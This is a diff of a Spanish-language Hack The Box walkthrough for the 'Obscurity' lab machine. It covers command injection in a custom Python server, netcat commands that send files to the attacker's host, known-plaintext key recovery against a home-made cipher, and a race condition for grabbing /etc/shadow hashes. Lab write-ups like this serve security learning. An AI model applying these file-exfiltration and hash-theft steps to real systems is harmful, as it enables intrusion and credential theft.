@@ -1,10 +1,13 @@
 # 10.10.10.168 - Obscurity
+![Obscurity](https://user-images.githubusercontent.com/96772264/210838459-b399ceed-41cc-4ba7-aa83-e1d5b8c5c35e.png)
+
 --------------------------
 
 # Part 1: Enumeración
 
 Puertos abiertos 22(ssh) y 8080(http) 
 En el puerto 8080 nos topamos con una web relativamente simple:
+![obscrity1](https://user-images.githubusercontent.com/96772264/210838483-c6833d11-ae40-438f-91e7-7c17cf35a98a.PNG)
 
 ```
 0bscura
@@ -25,7 +28,6 @@ secure@obscure.htb
 Desarrollo del servidor -> el codigo fuente de la web está en 'SuperSecureServer.py' en el directorio secreto de
 desarollo.
 ```
-
 En el codigo fuente no encontramos más.
 Si pongo en el /etc/hosts obscure.htb pero sale lo mismo
 ```console
@@ -56,7 +58,6 @@ Cada pocas busquedas se cuelga esto, como habla de directorio "dev"....
 # Part 2: Framwork custom
 
 En /develop/SuperSecureServer.py podemos obtener el codigo fuente de la web
-
 Si tenemos un codigo antes de analizarlo es mejor buscar funciones peligrosas, que es realmente lo que interesa
 entre todo
 ```console
@@ -108,8 +109,7 @@ Por tanto podríamos tener ejecución remota de comandos.
 -------------------------------
 # Part 3: Script custom de encriptado
 
-Por netcat entramos en el sistema como www-data
-Antes de hacer mas enumeración en la carpeta home del usaurio robert encontramos cosas curiosas:
+Por netcat entramos en el sistema como www-data. Antes de hacer mas enumeración en la carpeta home del usaurio robert encontramos cosas curiosas:
 ```console
 www-data@obscure:/home/robert$ ls
 BetterSSH  out.txt		SuperSecureCrypt.py
@@ -118,9 +118,8 @@ www-data@obscure:/home/robert$ cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct!
 ```
 
-El script encripta y desencripta, para desencriptar nos pide un archivo y una llave para sacar en otro (resultado)
-out.txt y passwordreminder.txt son bytes sin sentido. Paso todo a mi sistema porque si le haces cat a una cadena
-cifrada se puede quedar colgado el sistema
+El script encripta y desencripta, para desencriptar nos pide un archivo y una llave para sacar en otro (resultado) out.txt y passwordreminder.txt son bytes 
+sin sentido. Paso todo a mi sistema porque si le haces cat a una cadena cifrada se puede quedar colgado el sistema
 
 ```console
 www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < out.txt
@@ -128,10 +127,8 @@ www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < check.txt
 www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < SuperSecureCrypt.py
 www-data@obscure:/home/robert$ nc 10.10.14.16 6666 < passwordreminder.txt
 ```
-Si tenemos dos cosas (encriptado y llave) para sacar una tercera (desencriptado), como en el enciprtado XOR
-Podemos hacer que esas dos cosas sean encriptado y desencriptado para sacar la llave sin necesidad de saber
-las minucias del algoritmo que ha utilizado.
-
+Si tenemos dos cosas (encriptado y llave) para sacar una tercera (desencriptado), como en el enciprtado XOR. Podemos hacer que esas dos cosas sean encriptado
+y desencriptado para sacar la llave sin necesidad de saberlas minucias del algoritmo que ha utilizado.
 ```console
 └─$ python3 SuperSecureCrypt.py -i out.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -d -o ./contraseña.txt
 └─$ cat ./contraseña.txt
@@ -149,14 +146,11 @@ robert@obscure:~$
 ------------------------------
 # Part 4: Escalada de privilegios
 
-Nuesto usuario robert pertenece al grupo adm, es similar al sudoers, en sentido que puede ejecutar en nombre de 
-un administrador determinadas cosas, en este caso:
+Nuesto usuario robert pertenece al grupo adm, es similar al sudoers, en sentido que puede ejecutar en nombre de un administrador determinadas cosas, en este caso:
 ```
 (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 ```
-Lo mas sencillo seria secuestrar el script añadiendo alguna linea que nos interese, pero no tiene permiso de 
-escritura
-El script es tal que así:
+Lo mas sencillo seria secuestrar el script añadiendo alguna linea que nos interese, pero no tiene permiso de escritura. El script es tal que así:
 
 ```python
 import sys, os, time, crypt, traceback, subprocess
@@ -168,14 +162,14 @@ session['user'] = input("Enter username: ")
 passW = input("Enter password: ")
 with open('/etc/shadow', 'r') as f: # Linea con la contraseña haseada ej robert:$y$ABC.$
     data = f.readlines()
-data = [(p.split(":") if "$" in p else None) for p in data] # Fragmentos shadow-> ['robert','$y$ABC.$def','']
+data = [(p.split(":") if "$" in p else None) for p in data] # Fragmentos del /etc/shadow -> ['robert','$y$ABC.$def','']
 passwords = []
 for x in data:
     if not x == None:
         passwords.append(x) # En passwords están todos los fragmentos del shadow que ha sacado
 
 passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
-with open('/tmp/SSH/'+path, 'w') as f: # En /tmp/SSH/d1Q3v3xK mete los fragmentos separados por salto de linea
+with open('/tmp/SSH/'+path, 'w') as f: # En /tmp/SSH/d1Q3v3xK mete los fragmentos del shadow separados por salto de linea
     f.write(passwordFile)
 time.sleep(.1) # Espera un micro segundo
 salt, realPass = "", ""
@@ -206,9 +200,8 @@ if session['authenticated'] == 1: # Se implementa este falso SSH
         print('Output: ' + o.decode('ascii'))
         print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
 ```
-Durante muy poco tiempo bajo /tmp/SSH (si existe) se crea una carpeta random donde estan las contraseñas del 
-/etc/shadow temporalmente. Luego se borra este archivo. Si intentamos leerlo de manera normal no podremos por el
-poco tiempo que está, asi que esto se soluciona con un bucle while true a velocidad informática.
+Durante muy poco tiempo bajo /tmp/SSH (si existe) se crea una carpeta random donde estan las contraseñas del /etc/shadow temporalmente. Luego se borra este archivo.
+Si intentamos leerlo de manera normal no podremos por el poco tiempo que está, asi que esto se soluciona con un bucle while true a velocidad informática.
 
 ```console
 # ----- Terminal 1 -----
@@ -342,6 +335,6 @@ O simplificar mas aún:
 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich'
 ```
 Zip empareja los elementos equivalentes en posición de cada lista
-[Hola y test] en (H,t)  (o,e)  (l,s) y (a,t) 
+\[Hola y test\] en (H,t)  (o,e)  (l,s) y (a,t) 
 Y les asignamos a y b a cada iteracion a la que se el aplica la operacion antes del for: chr(ord(a) - ord(b)))
 
